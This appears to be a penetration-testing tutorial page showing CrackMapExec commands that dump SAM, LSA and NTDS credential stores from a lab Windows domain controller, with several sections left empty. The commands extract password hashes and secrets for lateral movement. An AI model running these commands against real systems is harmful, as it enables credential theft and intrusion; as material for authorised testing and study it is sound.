---
description: >-
  Learn how to Dump Credentials with CrackMapExec and move laterally inside
  infrastructures.
coverY: 0
---

# 🔥 Dump Credentials with CrackMapExec

### Environment Credentials

#### Dump Credentials from SAM File

{% code overflow="wrap" %}
```
crackmapexec smb 192.168.1.119 -u 'Administrator' -p 'Password!' -d dc.deathstar.rfs --sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>SAM Dump</p></figcaption></figure>

#### LSA

{% code overflow="wrap" %}
```bash
crackmapexec smb 192.168.1.119 -u 'Administrator' -p 'Password!' -d dc.deathstar.rfs --lsa
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>LSA Dump</p></figcaption></figure>

#### LAPS

#### NTDS drsuapi

{% code overflow="wrap" %}
```
crackmapexec smb 192.168.1.119 -u 'Administrator' -p 'Password!' -d dc.deathstar.rfs --ntds
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption><p>Dump NTDS DRSUAPI</p></figcaption></figure>

#### NTDS VSS

{% code overflow="wrap" %}
```
crackmapexec smb 192.168.1.119 -u 'Administrator' -p 'Password!' -d dc.deathstar.rfs --ntds vss
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Applications Credentials

#### Wireless Passwords

#### KeePass Databases
